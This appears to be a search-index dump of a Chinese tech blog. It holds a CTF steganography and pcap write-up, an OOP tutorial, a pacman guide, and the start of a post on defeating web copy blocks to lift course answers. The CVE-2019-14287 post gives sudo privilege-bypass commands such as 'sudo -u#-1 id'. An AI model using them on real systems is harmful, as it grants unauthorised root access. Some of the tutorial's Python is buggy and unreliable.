from the Greek words steganos meaning \"co vered or protected\", and graphein meaning \"to w rite\". The first recorded use of the term was in 1499 by Joh annes Trithemius in his Steganographia, a trea tise on cryptography and steganography disg uised as a book on magic. Generally, mess ages will appear to be something else: images, arti cles, shopping lists, or some ot her covertext and, classically, the hidden message may be in invi sible ink between the visible lines of a private letter. The advantage of steganography, over cr yptography alone, is that messages do not attract attention to themselves. Plainly visible encrypted messages�no matter how unbreakable�will arouse s uspicion, and may in themselves be incriminating in countries where encryption is illegal. Therefore, whereas cryptography protects the contents of a message, steganography can be said to protect b oth messages and communicating parties. Steganography inclu des the concealment of information within com puter files. In digital steganography, electronic communication s may include steganographic coding insi de of a transport layer, such as a document file, image fil e, program or protocol. Media files are ideal for steganographic transmissio n because of their large size. As a simple example, a sender might start with a n innocuous image file and adjust the color of every 100th pixel to correspond to a letter in the alphabet, a change so subtle that someone not specifically looking f or it is unlikely to notice it. The first recorded uses of steganography can be tr aced back to 440 BC when Herodotus mentions two examples o f steganography in The Histories of Herodotus. Demaratus sent a warning about a forthcoming attack to Greece by w riting it directly on the wooden backing of a wax tablet bef ore applying its beeswax surface. Wax tablets were in common use then as reusable writing surfaces, sometime s used for shorthand. Another ancient example is that o f Histiaeus, who shaved the head of his most trusted s lave and tattooed a message on it. After his hair had g rown the message was hidden. The purpose was to instigate a revolt against the Persians. Steganography has b een widely used, including in recent historical times and t he present day. Possible permutations are endless and known examples include: * Hidden messages within wax ta blets: in ancient Greece, people wrote me ssages on the wood, then covered it with wax upon which an innocen t covering message was written . * Hidden messages on messenger's body: also used in ancien t Greece. Herodotus tells the story o f a message tattooed on a slave's shaved head, hidden by the growth of his hair, and exposed by shaving his head again. The message allegedly carried a warning to Greece abo ut Persian invasion plans. Th is method has obvious drawbacks, such as delayed transmission while waiting for the s lave's hair to grow, and the restrictions o n the number and size of mess ages that can be encoded on one person 's scalp. * In WWII, the French Resistance sent some messages w ritten on the backs of couriers using invisible ink. * Hidden messages on paper wr itten in secret inks, under other messages or on the blank parts of other messages. * Messages written in Morse code on knitting yarn and then knitted into a piece of clothing wor n by a courier. * Messages written on the back o f postage stamps. * During and after World War II, espionage agents used photographically p roduced microdots to send information back and forth. Microdots were typically minute, approximately less than the size of the period prod uced by a typewriter. WWII microdots needed to be embedded in the paper and covered with an adhesive (such as collodion). T his was reflective and thus detectable by viewing against glancing light. Alternative techniques included inserting microdots into slits cut into the edge of post cards. * During World War II, a spy for Japan in New York City, Velvalee Dickinson, sent information to accommodatio n addresses in neutral South Americ a. She was a dealer in dolls, and her letters discussed how many of this or that doll to ship. The stegotext was the doll orders, while the concealed \"plaintext\" was itself enco ded and gave information about ship movements, etc. Her case became somewhat fa mous and she became known as the Doll Woman. * Cold War count er-propaganda. In 1968, crew membe rs of the USS Pueblo (AGER-2) intelligence ship held as pr isoners by North Korea, communicated in sign language during staged photo opport unities, informing the United States they were not defectors but rather were being held ca ptive by the North Koreans. In other photo s presented to the US, crew members gave \"the finger\" to the unsuspecting North Koreans, in an attempt to discredit photos that showed them smi ling and comfortable. -- http://en.wikipedia.org /wiki/Steganography 推测是base64隐写，跑脚本得到flag：flag{Base_sixty_four_point_five}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import base64 import sys def deStego(stegoFile): b64table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" with open(stegoFile,'r') as stegoText: message = \"\" for line in stegoText: try: text = line[line.index(\"=\") - 1:-1] message += \"\".join([ bin( 0 if i == '=' else b64table.find(i))[2:].zfill(6) for i in text])[2 if text.count('=') ==2 else 4:6] except: pass return \"\".join([chr(int(message[i:i+8],2)) for i in range(0,len(message),8)]) if __name__ == \"__main__\": if len(sys.argv) == 2: print(deStego(sys.argv[1])) else: print(deStego(\"stego.txt\"))   0x0c 功夫再高也怕菜刀  题目描述：菜狗决定用菜刀和菜鸡决一死战\n 下载附件发现是一个.pcapng文件，是一个wireshark流量包。\n用wireshark打开，ctrl+F查找flag\n发现里面有zip和flag.txt还有6666.jpg。\n追踪6666.jpg那一行的TCP请求，右键追踪TCP流\n由于图片JPG的文件头是FFD8文件尾是FFD9，将文件另存为 ，然后用文本编辑器，编辑导出的文件，查找并删除第一个jpg文件头（FFD8）和最后一个文件尾（FFD9）之外的字符串，剩下的全是十六进制字符串。然后把十六进制保存为图片，我用的“010 Editor”，打开后新建空白文件，复制图片十六进制字符串到粘贴板，点击菜单栏“Edit-Paste From-Paste From Hex Text”，然后保存为图片就行了，保存后的图片如下图。\n刚才看到里面有存在一个hello.zip，便用foremost处理流量包，分理出一个压缩文件，里面就是flag.txt，为加密文件，联想至刚刚那张复原的图片，用密码Th1s_1s_p4sswd_!!!尝试打开文件，得到flag：flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}\n","description":"","tags":["ctf","misc"],"title":"XCTF-adworld-misc-wp","uri":"/posts/xctf-adworld-misc-wp/"},{"categories":[],"content":"虽然一直再写面向对象编程的语言，但是压根没有对象可以面对，希望写完这篇能有对象可以让我面对！！！\n简介 面向对象编程(Object-oriented Programming,缩写：OOP)是软件工程中一种具有对象概念的编程范式(Programming Paradigm)，同时也是一种程序开发的抽象方针，与之对应的编程范式还有：函数式编程(Functional Programming)、过程式编程(Procedural Programming)、响应式编程(Reactive Programming)等。\n面向对象的程序设计（OOP）是面向过程程序设计的继承和发展，它不仅汲取了后者的精华，而且以一种更加接近人类思维的方式来分析和解决问题：程序是对现实世界的抽象和描述，现实世界的基本单元是物体，与之对应的，程序中的基本单元是对象。\n面向对象思想认为：现实世界是由对象组成的，无论大到一个国家还是小到一个原子，都是如此。并且对象都由两部分组成： 描述对象状态或属性的数据（变量）以及描述对象行为或者功能的方法（函数）。并且与面向过程不同，面向对象是将数据和操作数据的函数紧密结合，共同构成对象来更加精确地描述现实世界，这是面向过程和面向对象两者最本质的区别。\n对象与类 在面向对象编程中，最常见的表现就是基于类(Class)来表现的，每一个对象实例都有具体的类，即对象的类型。使用类的面向对象编程也称为基于类的编程(Class-based programming)，如常见的Java，C++；而与之类似的有基于原型的编程(Prototype-based programming)，如JavaScript。\n 类：定义对象的数据格式(属性类型)和可用过程(方法)，同时也可能包含类成员的数据(如，常量)和过程(如，静态方法)，类其实就是对象的类型/原型(prototype)。 对象：类的实例，通过类实例化出来的具体实例。  面向对象的三大特征 面向对象的三大特征分别是：封装、继承、多态 。\n 封装(Encapsulation)  通过对象隐藏程序的具体实现细节，将数据与操作包装在一起，对象与对象之间通过消息传递机制实现互相通信（方法调用），具体的表现就是通过提供访问接口实现消息的传入传出。\n封装常常会通过控制访问权限来控制对象之间的互访权限，常见的访问权限：公有(public)，私有(private)，保护(protected)。某些语言可能还会提供更加具体的访问控制，如，Java的package。\n封装的意义：由于封装隐藏了具体的实现，如果实现的改变或升级对于使用方而言是无感知的，提高程序的可维护性；而且封装鼓励程序员把特定数据与对数据操作的功能打包在一起，有利于应用程序的去耦。\n 继承(Inheritance)  支持类的语言基本都支持继承，继承即类之间可以继承，通过继承得到的类称为子类，被继承的类为父类，子类相对于父类更加具体化。\n子类具有自己特有的属性和方法，并且子类使用父类的方法也可以覆盖(重写)父类方法，在某些语言中还支持多继承，但是也带来了覆盖的复杂性。\n继承的意义：继承是代码复用的基础机制\n 多态(Polymorphism)  多态发生在运行期间，即子类型多态，指的是子类型是一种多态的形式，不同类型的对象实体有统一接口，相同的消息给予不同的对象会引发不同的动作。\n多态的意义：提供了编程的灵活性，简化了类层次结构外部的代码，使编程更加注重关注点分离(Separation of concerns，SoC)\n关于面向对象编程的设计模式，可以参考谈谈面向对象编程\nPython3面向对象编程  参考：\n一文看懂Python面向对象编程核心思想(Python学习与Django入门必看)\nPython3 面向对象\nPython面向对象编程\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  #!/usr/bin/python3 class people: #默认为公有变量 name = \"\" age = 0 #定义私有变量，即在变量前加入 __ __weight = 0 num = 0 #类专有方法，可重写 def __init__(self,n,a,w): self.name = n self.age = a self.__weight = w self.num += 1 #类方法一般第一个参数为self def speak(self): print('I am %s,and I am %dyears old' % (self.name,self.age)) @classmethod def tol(cls): print(\"total numble of people is {}\".format(self.num)) #这个为类方法，可直接使用people.tol() #student 继承people类 class student(people): grade = \"\" def __init__(self,n,a,w,g): people.__init__(self,n,a,w) self.grade = g #方法重写 def speak(self): print(\"I am a %sstudent.\\nMy name is %s\" % (self.grade,self.name)) #类的私有方法 def __show_detail(self): print(self.name+\"\\t\"+self.age+\"\\t\"+self.__weight+\"\\n\"+self.grade) #封装 def getWeight(self): return self.weight #python有多重继承 class sample(people, student): tag = \"\" def __init__(self,n,a,w,g,t): people.__init__(self,n,a,w) student.__init__(self,g=g) tag = t s1 = student(\"Alice\",16,47,\"7th grades\")   python提供类的转有方法，可进行方法重写\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  __init__ : 构造函数，在生成对象时调用 __del__ : 析构函数，释放对象时使用 __repr__ : 打印，转换 __setitem__ : 按照索引赋值 __getitem__: 按照索引获取值 __len__: 获得长度 __cmp__: 比较运算 __call__: 函数调用 __add__: 加运算 __sub__: 减运算 __mul__: 乘运算 __truediv__: 除运算 __mod__: 求余运算 __pow__: 乘方 反向运算符重载： __radd__: 加运算 __rsub__: 减运算 __rmul__: 乘运算 __rdiv__: 除运算 __rmod__: 求余运算 __rpow__: 乘方 复合重载运算符 __iadd__: 加运算 __isub__: 减运算 __imul__: 乘运算 __idiv__: 除运算 __imod__: 求余运算 __ipow__: 乘方    注：_new_()方法 python中定义的类在创建实例对象的时候，会自动执行init()方法，但是在执行init()方法之前，会执行new()方法。\nnew()的作用主要有两个。\n1.在内存中为对象分配空间 2.返回对象的引用。（即对象的内存地址）\npython解释器在获得引用的时候会将其传递给init()方法中的self。\n1 2 3 4 5 6 7 8  class A: def __new__(cls,*args,**kwargs): print('__new__') return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__') a = A()   输出结果\n__new__ __init__ 我们一定要在new方法中最后调用\n1  return super().__new__(cls)   否则init方法不会被调用\n1 2 3 4 5 6 7 8 9  class A: def __new__(cls,*args,**kwargs): print('__new__') # return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__') a = A()   输出\n__new__ 像以前一样，我们不写new方法试试\n1 2 3 4 5 6 7 8 9  class A: # def __new__(cls,*args,**kwargs): # print('__new__') # return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__') a = A()   输出\n__init__  私有属性-封装 在实际开发中，对象 的 某些属性或方法 可能只希望 在对象的内部被使用，而 不希望在外部被访问到\n定义方式\n在 定义属性或方法时，在 属性名或者方法名前 增加 两个下划线__ 实际开发中私有属性也不是一层不变的。所以要给私有属性提供外部能够操作的方法。\n7.1) 通过自定义get set方法提供私有属性的访问\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Person: def __init__(self, name, age): self.name = name self.__age = age #定义对私有属性的get方法，获取私有属性 def getAge(self): return self.__age #定义对私有属性的重新赋值的set方法，重置私有属性 def setAge(self,age): self.__age = age person1 = Person(\"tom\",19) person1.setAge(20) print(person1.name,person1.getAge()) #tom 20   7.2) 调用property方法提供私有属性的访问\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  class Student: def __init__(self, name, age): self.name = name self.__age = age #定义对私有属性的get方法，获取私有属性 def getAge(self): return self.__age #定义对私有属性的重新赋值的set方法，重置私有属性 def setAge(self,age): self.__age = age p = property(getAge,setAge) #注意里面getAge,setAge不能带() s1 = Student(\"jack\",22) s1.p = 23 #如果使用=,则会判断为赋值，调用setAge方法。 print(s1.name,s1.p) #jack 23 ，直接使用s1.p会自动判断会取值，调用getAge print(s1.name,s1.getAge()) #jack 23,这个时候set,get方法可以单独使用。   7.3) 使用property标注提供私有属性的访问\n注意： 一旦给函数加上一个装饰器@property,调用函数的时候不用加括号就可以直接调用函数了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  class Teacher: def __init__(self, name, age,speak): self.name = name self.__age = age self.__speak = speak @property #注意1.@proterty下面默认跟的是get方法，如果设置成set会报错。 def age(self): return self.__age @age.setter #注意2.这里是使用的上面函数名.setter，不是property.setter. def age(self,age): if age \u003e 150 and age \u003c=0: #还可以在setter方法里增加判断条件 print(\"年龄输入有误\") else: self.__age = age @property def for_speak(self): #注意2.这个同名函数名可以自定义名称，一般都是默认使用属性名。 return self.__speak @for_speak.setter def for_speak(self, speak): self.__speak = speak t1 = Teacher(\"herry\",45,\"Chinese\") t1.age = 38 #注意4.有了property后，直接使用t1.age,而不是t1.age()方法了。 t1.for_speak = \"English\" print(t1.name,t1.age,t1.for_speak) #herry 38 English    C++面向对象编程  引用：\nc++面向对象程序设计总结(类的使用)\nC++ 类 \u0026 对象\nC++面向对象基础\n 析构函数 析构函是类的一个成员函数，名字由波浪号接类名构成。它没有返回值，也不接受参数：\n1 2 3 4 5  class Foo{ public: ~Foo(); //析构函数  //...  };   由于析构函数不接受参数，因此它不能被重载。对于一个给定类，只会由唯一一个析构函数。\n在一个构造函数中，成员的初始化时在函数体执行之前完成的，且按照它们在类中出现的顺序进行初始化。在一个析构函数中，首先执行函数体，然后销毁成员。成员按初始化顺序的逆序进行销毁。\n无论何时一个对象被销毁，就会自动调用其析构函数：\n ​\t1.变量在离开其作用域时被销毁 ​\t2.当一个对象被销毁时，其成员被销毁 ​\t3.容器(无论是标准容器还是数组)被销毁时，其元素被销毁 ​\t4.对于动态分配的对象，当对指向它的指针应用delete运算符时被销毁 ​\t5.对于临时对象，当创建它的完整表达式结束时被销毁\n    未完待续\n   ","description":"","tags":[],"title":"Object-oriented Programming","uri":"/posts/object-oriented-programming/"},{"categories":["linux"],"content":" 引用：\nPotential bypass of Runas user restrictions (sudo official page)\nCVE-2019-14287：sudo权限绕过漏洞分析与复现\nLinux Sudo暴userID提权漏洞CVE-2019-14287\nsudo 用法简介\n 第一次复现CVE漏洞，十分滴激动\n概述 Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。\n2019年10月14日，Sudo官方发布了Sudo 1.8.28版本，其中包含sudo root权限绕过漏洞（CVE-2019-14287）的补丁修复。\n利用前提  sudo -v \u003c 1.8.28 知道当前用户的密码 当前用户存在于sudo权限列表  漏洞复现 复现是在sudo 1.8.16的版本下进行的，对于低于1.8.28的版本都起作用\n1  test\tALL=(ALL,!root)\t/usr/bin/id   其中，在sudoers配置中，以上语句代表着test用户，ALL=(ALL,!root)代表指定用户，即所有除root以外的用户都可运行命令/usr/bin/id\n一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图（第三张图）所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令\n如果想利用该漏洞来实施攻击，用户需要拥有sudo权限，并允许用户使用任意用户ID来运行命令（如下图中定义了test用户可用id命令，但不能以root用户执行命令id（test ALL=(ALL,!root) /usr/bin/id））。通常来说，这意味着用户的sudoer项在Runas规范中定义了特殊的ALL值。如果sudoer策略允许的话，sudo支持由用户指定的用户名或用户ID来运行命令。\n如果sudoer条目允许用户以任意用户身份运行命令（非root），那么攻击者就可以利用该漏洞来绕过这种限制了。\n1 2  sudo -u#-1 id sudo -u#4294967295 id   上述命令运行之后，将返回“0”。这是因为sudo命令本身已经在以用户ID“0”运行了，所以当sudo尝试将用户ID修改为“-1”时，不会发生任何变化。\n但是，sudo日志条目中记录下的命令运行用户的ID为“4294967295”，而并非root用户（或用户ID为“0”），除此之外，因为用户ID是通过-u选项指定的，并且不会在密码数据库中存储，所以PAM会话模块也不会运行。\n漏洞片段\n漏洞CVE-2019-14287的源于sudo调用的系统函数setresuid()和setreuid()在参数处理中会将 -1（或其等效的无符号整数4294967295）误认为是 0，而这正好是 root 用户的UserID 。\n实际上，只要用户的权限足够高，即拥有最高sudo权限的用户，并且在Runas规范中定义了ALL关键字的话，他们就可以运行Runas规范中明确禁止使用的那些root命令，而且以这种方式运行的命令其日志项所显示的目标用户为4294967295，而不是root。与此同时，在执行相应命令的过程中，PAM会话模块将不会运行。\n","description":"","tags":["CVE","linux"],"title":"CVE-2019-14287","uri":"/posts/cve-2019-14287/"},{"categories":["linux"],"content":"包管理工具 Pacman  参考：\nPacman Home Page\n[pacman wiki](https://wiki.archlinux.org/index.php/Pacman_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\nArchLinux 的 pacman 命令详解\n  警告: 在Arch下安装软件包时，未更新系统前，不要更新软件包数据库（例如，可能出现某软件包不再出现在官方库）。操作时，应使用pacman -Syu *package_name*, 而不要使用（pacman -Sy *package_name*），否则可能会有依赖问题。参见 System maintenance (简体中文)#不支持部分升级 和 BBS#89328.\n 安装指定的包 安装或者升级单个软件包，或者一列软件包（包含依赖包），使用如下命令：\n1  $ pacman -S package_name1 package_name2 ...   用正则表达式安装多个软件包（参见 pacman 小贴士: invalid section]和这个帖子）：\n1  $ pacman -S $(pacman -Ssq package_regex)   有时候在不同的软件仓库中，一个软件包有多个版本（比如[extra]和[testing]）。可以选择一个来安装：\n1  $ pacman -S extra/package_name   安装多个含有相似名称的软件包，而并非整个包组或全部匹配的软件包； 例如，plasma:\n1  $ pacman -S plasma-{desktop,mediacenter,nm}   当然，可以多层扩展，并不作限制：\n1  $ pacman -S plasma-{workspace{,-wallpapers},pa}   安装包组 一些包属于一个可以同时安装的软件包组。例如，运行下面的命令\n1  $ pacman -S gnome   会提醒用户选择 gnome 内需要安装的包。\n有的包组包含大量的软件包，有时用户只需其中几个。除了逐一键入序号外，pacman 还支持选择或排除某个区间内的的软件包：\n1  Enter a selection (default=all): 1-10 15   这将选中序号 1 至 10 和 15 的软件包。而\n1  Enter a selection (default=all): ^5-8 ^2   将会选中除了序号 5 至 8 和 2 之外的所有软件包。\n想要查看哪些包属于 gnome 组，运行：\n1  $ pacman -Sg gnome   也可以访问 https://www.archlinux.org/groups/ 查看可用的包组。\n注意: 如果列表中的包已经安装在系统中，它会被重新安装，即使它已经是最新的。可以用 --needed 选项覆盖这种行为。\n删除软件包 删除单个软件包，保留其全部已经安装的依赖关系\n1  $ pacman -R package_name   删除指定软件包，及其所有没有被其他已安装软件包使用的依赖关系：\n1  $ pacman -Rs package_name   要删除软件包和所有依赖这个软件包的程序:\n警告: 此操作是递归的，请小心检查，可能会一次删除大量的软件包。\n1  $ pacman -Rsc package_name   要删除软件包，但是不删除依赖这个软件包的其他程序：\n1  $ pacman -Rdd package_name   pacman 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件：\n1  $ pacman -Rn package_name   注意: pacman 不会删除软件自己创建的文件(例如主目录中的 .dot 文件不会被删除。\n升级软件包  警告: * 建议所有用户都经常性的更新系统\n Arch 只支持系统完整升级，详细参见不支持部分升级和#安装软件包。   一个 pacman 命令就可以升级整个系统。花费的时间取决于系统有多老。这个命令会同步非本地(local)软件仓库并升级系统的软件包：\n1  $ pacman -Syu   查询包数据库 pacman 使用 -Q 参数查询本地软件包数据库。参见：\n1  $ pacman -Q --help   使用 -S 参数来查询远程同步的数据库。参见：\n1  $ pacman -S --help   pacman 可以在包数据库中查询软件包，查询位置包含了软件包的名字和描述：\n1  $ pacman -Ss string1 string2 ...   有时，-s的内置正则会匹配很多不需要的结果，所以应当指定仅搜索包名，而非描述或其他子段，下面的命令就会返回很多不必要结果:\n1  $ pacman -Ss '^vim-'   要查询已安装的软件包：\n1  $ pacman -Qs string1 string2 ...   按文件名查找软件库：\n1  $ pacman -Fs string1 string2 ...   显示软件包的详尽的信息：\n1  $ pacman -Si package_name   查询本地安装包的详细信息：\n1  $ pacman -Qi package_name   使用两个 -i 将同时显示备份文件和修改状态：\n1  $ pacman -Qii package_name   要获取已安装软件包所包含文件的列表：\n1  $ pacman -Ql package_name   查询远程库中软件包包含的文件：\n1  $ pacman -Fl package_name   检查软件包安装的文件是否都存在：\n1  $ pacman -Qk package_name   两个参数k将会执行一次更彻底的检查。 查询数据库获取某个文件属于哪个软件包：\n1  $ pacman -Qo /path/to/file_name   查询文件属于远程数据库中的哪个软件包：\n1  $ pacman -Fo /path/to/file_name   要罗列所有不再作为依赖的软件包(孤立orphans)：\n1  $ pacman -Qdt   要罗列所有明确安装而且不被其它包依赖的软件包：\n1  $ pacman -Qet   要显示软件包的依赖树：\n1  $ pactree package_name   检查一个安装的软件包被那些包依赖，可以使用 pkgtoolsAUR中的whoneeds:\n1  $ whoneeds package_name   或者pactree中使用-r:\n1  $ pactree -r package_name   数据库结构 pacman数据库通常位于 /var/lib/pacman/sync. 对于每一个在/etc/pacman.conf中指定的软件仓库， 这里都有一个一致的数据库。数据库文件夹里每个tar.gz文件都包含着一个仓库的软件包信息。例如which 包:\n% tree which-2.20-6 which-2.20-6 |-- depends `-- desc 这个 depends 项列出了该软件的依赖包， 而desc有该包的介绍，例如文件大小和MD5值 。\n清理软件包缓存 pacman 将下载的软件包保存在 /var/cache/pacman/pkg/ 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。\n使用内建选项即可清除未安装软件包的缓存：\n1  $ pacman -Sc   警告:\n 仅在确定当前安装的软件包足够稳定且不需要降级时才执行清理。pacman -Sc仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 Arch Linux Archive (简体中文)中获取了。 pacman -Scc 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。  由于以上种种局限，建议使用专门的脚本去处理清理哪些、清理多少缓存：\npacman-contrib 提供的 paccache 命令默认会删除近3个版本前的软件包\n# paccache -r Tip: 可以使用 pacman hooks 自动执行清理，这里是参考示例。\n也可以自己设置保留最近几个版本：\n# paccache -rk 1 清理所有未安装包的缓存文件，再此运行paccache:\n# paccache -ruk0 更多功能参见paccache -h。\npaccache，还可以使用 Arch User Repository 中的 pkgcachecleanAUR：\n# pkgcacheclean ，以及pacleanerAUR，这两个是未来的替代工具.\n其它命令 升级系统时安装其他软件包：\n1  $ pacman -Syu package_name1 package_name2 ...   下载包而不安装它：\n1  $ pacman -Sw package_name   安装一个本地包(不从源里下载）：\n1  $ pacman -U /path/to/package/package_name-version.pkg.tar.xz   要将本地包保存至缓存，可执行：\n1  $ pacman -U file://path/to/package/package_name-version.pkg.tar.xz   安装一个远程包（不在 pacman 配置的源里面）：\n1  $ pacman -U http://www.example.com/repo/example.pkg.tar.xz   要禁用 -S, -U 和 -R 动作，可以使用 -p 选项.\npacman 会列出需要安装和删除的软件，并在执行动作前要求需要的权限。\n安装原因 pacman数据库按照软件包被安装的原因，将其分为两类：\n 指定安装包：通过pacman-S或者-U指令安装的软件包。 依赖包：指定安装包所依赖的软件包，尽管命令中未传入，但仍然会被安装。  当安装软件包时，可以把安装原因指定设为依赖:\n# pacman -S --asdeps package_name 但是当重新安装该软件包时，安装原因将会被设为软件包所默认的。 指定安装的软件包列表可用pacman -Qe, 已安装的依赖包可用pacman -Qd获取。 改变某个已安装软件包的安装原因，可以执行：\n# pacman -D --asdeps package_name 使用--asexplicit改为指定安装。\n查询一个包含具体文件的包名 同步文件数据库:\n# pacman -Fy 查询包含某个文件的包名，比如:\n# pacman -Fs pacman core/pacman 5.0.1-4 usr/bin/pacman usr/share/bash-completion/completions/pacman extra/xscreensaver 5.36-1 usr/lib/xscreensaver/pacman 提示： 可以设置一个 crontab 或者 systemd timer 来定期同步文件信息数据库。\n如果需要高级功能请安装 pkgfile，它使用一个单独的数据库来保存文件和它们所关联的软件包的信息。\nArchLinux的版本库里面包括：\n　core-核心软件包 extra-其他常用软件 community-社区软件包，譬如Mysql等。 testing-正在测试阶段，还没有正式加入源的软件包。通常软件版本比较新，但是不是非常稳定 release-已经发布的软件包 unstable-非正式的软件包，可能包括以前版本的软件或者测试软件\n　因为Pacman的软件都是从源里面更新，因此在/etc/pacman.d里面配置这些软件源的地址。在/etc/pacman.d目录里面分别有上面几种软件类型对应的文件名，可以自己手工配置这些软件源的地址。\n","description":"","tags":["ArchLinux","tech"],"title":"pacman","uri":"/posts/pacman/"},{"categories":["web"],"content":"序：原本想从网页上搞些网课答案下来，懒得用爬虫，便想直接复制粘贴更方便，结果遭遇了网页的复制和控制台禁用，本着求知的精神，就有了这篇文章。\n网页中部分禁用及破解   利用js实现   禁用F12\n1 2 3 4 5 6 7 8 9 10  \u003cscript\u003e document.οnkeydοwn=function (e){ var currKey=0,evt=e||window.event; currKey=evt.keyCode||evt.which||evt.charCode; if (currKey == 123) { window.event.cancelBubble = true; window.event.returnValue = false; } } \u003c/script\u003e   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u003cscript\u003e var h = window.innerHeight,w=window.innerWidth; //禁用右键 （防止右键查看源代码） window.oncontextmenu=function(){\u003cbr\u003e return false;\u003cbr\u003e} //在本网页的任何键盘敲击事件都是无效操作 （防止F12和shift+ctrl+i调起开发者工具） window.onkeydown = window.onkeyup = window.onkeypress = function () { window.event.returnValue = false; return false; } //如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面 window.onresize = function () { if (h != window.innerHeight||w!=window.innerWidth){ window.close(); window.location = \"about:blank\"; } }; \u003c/script\u003e   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  \u003cscript\u003e (document).keydown(function() { return key(arguments[0]) }); function key(e) { //f12  var keynum; if (window.event) { keynum = e.keyCode; } else if (e.which) { keynum = e.which; } if (keynum == 123) { window.close(); return false; } //ctrl+shift  if (event.shiftKey\u0026\u0026event.ctrlKey) { window.close(); return false; } } function Click() { window.event.returnValue = false; } document.oncontextmenu = Click;// 右击 \u003c/script\u003e   禁用右键菜单\n1 2 3  \u003cscript\u003e document.oncontextmenu = function(){return false;} \u003c/script\u003e   禁用文本选择\n1 2 3  \u003cscript\u003e document.onselectstart = function(){return true;} \u003c/script\u003e    一个网页：当禁用js时无法打开，不禁用js，禁止复制、看源码、右键菜单、F12、文本选择  适合学习\n原网页：http://www.gebidemengmianren.com/eryadaanfufei/198.html?btwaf=99961145\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 598 599 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 615 616 617 618 619 620 621 622 623  \u003c!DOCTYPE html\u003e \u003chtml lang=\"zh-CN\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"Cache-Control\" content=\"no-transform\" /\u003e \u003cmeta http-equiv=\"Cache-Control\" content=\"no-siteapp\" /\u003e \u003cmeta name=\"applicable-device\" content=\"pc,mobile\"\u003e \u003cmeta name=\"MobileOptimized\" content=\"width\" /\u003e \u003cmeta name=\"HandheldFriendly\" content=\"true\" /\u003e \u003cmeta name=\"viewport\" 